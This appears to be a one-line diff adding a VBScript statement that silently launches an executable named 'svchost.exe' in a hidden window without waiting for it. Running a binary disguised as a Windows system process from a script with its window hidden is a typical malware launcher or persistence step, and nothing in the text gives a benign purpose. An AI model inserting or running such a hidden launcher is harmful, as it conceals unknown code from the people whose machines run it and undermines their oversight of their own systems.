@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "svchost.exe", 0, False
